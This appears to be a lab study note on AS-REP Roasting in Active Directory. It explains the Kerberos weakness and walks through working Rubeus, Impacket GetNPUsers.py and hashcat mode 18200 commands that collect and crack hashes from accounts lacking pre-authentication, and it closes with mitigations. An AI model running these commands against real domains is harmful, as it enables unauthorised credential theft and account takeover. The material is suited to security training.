# 🔐 AS-REP Roasting

> **Topic:** AD Authenticated Enumeration
>
> **Focus:** Identifying Active Directory accounts with Kerberos pre-authentication disabled and recovering their passwords through offline cracking.

---

# 📖 Overview

AS-REP Roasting is a Kerberos-based attack that targets user accounts with Kerberos pre-authentication disabled.

Unlike Kerberoasting, the affected accounts **do not need to be service accounts**.

The important requirement is:

```text
UF_DONT_REQUIRE_PREAUTH
```

or the Windows setting:

```text
Do not require Kerberos preauthentication
```

---

# 🔑 Why AS-REP Roasting Works

During normal Kerberos authentication, the user's password-derived key is used to encrypt a timestamp.

The Key Distribution Center (KDC) decrypts the timestamp to verify the user's identity.

When pre-authentication is disabled:

```text
User
 ↓
Kerberos Request
 ↓
KDC does not require pre-authentication
 ↓
Encrypted AS-REP returned
 ↓
AS-REP hash can be collected
 ↓
Offline password cracking
```

The returned encrypted AS-REP material can then be cracked offline.

---

# 🔄 Two Phases

AS-REP Roasting consists of two main phases:

```text
Phase 1
Enumeration
     ↓
Find vulnerable accounts
     ↓
Collect AS-REP hashes
     ↓
Phase 2
Offline Cracking
     ↓
Recover password
     ↓
Authenticate as user
```

---

# 1️⃣ Phase 1 — Identify Vulnerable Accounts

The objective is to identify accounts where Kerberos pre-authentication is disabled.

Accounts configured this way can expose encrypted authentication material without requiring the user to authenticate first.

---

# 🛠️ Rubeus

**Platform:** Windows

Rubeus is designed for Kerberos security testing and enumeration.

It can identify accounts with pre-authentication disabled and retrieve AS-REP hashes.

## Example

```cmd
Rubeus.exe asreproast
```

The supplied material describes this command as scanning Active Directory for accounts with pre-authentication disabled and retrieving hashes suitable for offline cracking.

---

# 🐍 Impacket — GetNPUsers.py

**Platform:** Linux / Windows

Impacket provides `GetNPUsers.py` for enumerating accounts susceptible to AS-REP Roasting.

A username list is supplied to the tool.

## Example

```bash
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

### Parameters

| Parameter | Purpose |
|---|---|
| `tryhackme.loc/` | Target domain |
| `-dc-ip` | Domain Controller IP |
| `-usersfile` | Candidate username file |
| `-format hashcat` | Output format suitable for Hashcat |
| `-outputfile hashes.txt` | Save collected hashes |
| `-no-pass` | Perform the request without supplying a password |

---

# 📄 Preparing users.txt

The supplied lab demonstrates creating a username file on the AttackBox:

```bash
cat > users.txt
```

Paste usernames and finish with:

```text
Ctrl + D
```

Example:

```text
Administrator
Guest
krbtgt
sshd
gerald.burgess
[...]
```

Verify:

```bash
cat users.txt
```

---

# 🔎 Running GetNPUsers.py

```bash
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

Example output may contain:

```text
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gerald.burgess doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Vulnerable accounts produce AS-REP hash material.

---

# 2️⃣ Phase 2 — Offline Cracking

Once AS-REP hashes have been collected, they can be cracked offline.

The supplied material uses:

**Hashcat**

---

# 🧰 Hashcat

Hashcat is a password-cracking tool.

For AS-REP hashes, the supplied material uses:

```text
Mode 18200
```

## Example

```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

### Parameters

| Parameter | Meaning |
|---|---|
| `-m 18200` | AS-REP Kerberos hash mode |
| `hashes.txt` | Collected AS-REP hashes |
| `wordlist.txt` | Candidate password list |

---

# 📚 RockYou Example

The lab uses:

```text
/usr/share/wordlists/rockyou.txt
```

Command:

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

The supplied lab output demonstrates a successfully cracked AS-REP hash, with the plaintext password intentionally redacted in the source.

---

# 🎯 After Cracking

A successfully recovered password can allow the tester to:

- Authenticate as the compromised user.
- Request Kerberos tickets.
- Access other authorised network resources.
- Continue enumeration or privilege analysis.

---

# 🛡️ Mitigations

The supplied material recommends:

- Enforce Kerberos pre-authentication for all user accounts.
- Use strong, complex passwords to make offline cracking harder.
- Monitor anomalous AS-REP requests on the KDC.

---

# 💡 Key Takeaways

- AS-REP Roasting targets accounts without Kerberos pre-authentication.
- The affected account does not have to be a service account.
- `UF_DONT_REQUIRE_PREAUTH` is the important account setting.
- Rubeus provides Windows-based enumeration.
- `GetNPUsers.py` provides a Linux/Windows approach.
- AS-REP hashes can be cracked offline.
- Hashcat mode `18200` is used for the supplied AS-REP workflow.
- Password strength and proper pre-authentication enforcement strongly affect attack success.
